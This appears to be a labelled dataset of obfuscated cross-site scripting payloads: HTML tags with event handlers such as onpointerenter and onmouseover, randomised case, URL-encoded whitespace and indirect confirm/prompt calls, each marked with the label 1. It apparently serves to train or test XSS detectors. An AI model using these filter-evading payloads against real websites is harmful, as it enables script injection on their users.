<D3V%0aONPoINTEreNteR%0d=%0d(prompt)``>v3dm0s,1
<A%09ONmoUsEoVER%09=%09[8].find(confirm)%0dx>v3dm0s,1
<a%09ONpoIntERenTER+=+[8].find(confirm)>v3dm0s,1
<hTml/+/oNmouSeOVeR+=+(prompt)``%0dx//,1
"<DetaIlS%09onTogGle%0a=%0aa=prompt%2Ca()%0dx//",1
<d3v%0aONPoinTeRentEr%0d=%0dconfirm()%0dx>v3dm0s,1
<d3V%0aOnMOUSEoVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,1
<D3v%09oNpOiNTerenteR%0d=%0dconfirm()>v3dm0s,1
"<html%0aonpOiNTErENtEr%09=%09a=prompt%2Ca()//",1
<d3v/+/ONPoiNTereNTer%0d=%0d(confirm)()>v3dm0s,1
<HTML%0aonPOiNteRENtER%0a=%0a[8].find(confirm)//,1
<Html/+/OnpoiNTeRenTEr%0d=%0d(confirm)()%0dx//,1
<htMl/+/OnMoUsEOvER%0a=%0aconfirm()%0dx>,1
"<detAIlS/+/oNPoinTEreNtER%0d=%0da=prompt%2Ca()%0dx>",1
<A%09oNPOInteReNTER+=+(prompt)``>v3dm0s,1
<hTml%0doNpOinTERenter%0d=%0dconfirm()//,1
<DeTAiLs%0aonpoiNTeREnteR%0d=%0d(confirm)()>,1
<DetaiLS%0dOnPoINTerENTer%0d=%0d(confirm)()%0dx//,1
<hTMl%0aoNmOuseoveR%0d=%0dconfirm()%0dx>,1
<D3v/+/ONpoiNtErEnteR%0d=%0dconfirm()%0dx>v3dm0s,1
<a/+/onMouseover%0a=%0aconfirm()>v3dm0s,1
<hTML%0dONmOUSeovEr%09=%09confirm()%0dx//,1
<a/+/ONPoINteREnter%09=%09(prompt)``>v3dm0s,1
<A%0dONpOINteReNtEr%0d=%0d(confirm)()%0dx>v3dm0s,1
<A/+/OnMoUSeovEr%09=%09[8].find(confirm)>v3dm0s,1
<D3V/+/ONPointerENTER%09=%09confirm()%0dx>v3dm0s,1
"<A%0aonPOinTerentER%09=%09a=prompt%2Ca()>v3dm0s",1
<a%09OnPoiNTereNteR%0a=%0a(prompt)``>v3dm0s,1
<A/+/ONpoinTERENteR%0a=%0aconfirm()%0dx>v3dm0s,1
<A/+/ONMouSeovEr+=+confirm()>v3dm0s,1
"<A/+/ONmOusEoVer%0a=%0aa=prompt%2Ca()%0dx>v3dm0s",1
<HTMl%09oNmOusEOVER+=+[8].find(confirm)%0dx//,1
<dEtails/+/OnpOiNtEReNTer%0d=%0dconfirm()>,1
<DEtails%0aoNtOGgle%0d=%0d(confirm)()%0dx>,1
<hTml%09onPoINTeReNTEr+=+(prompt)``>,1
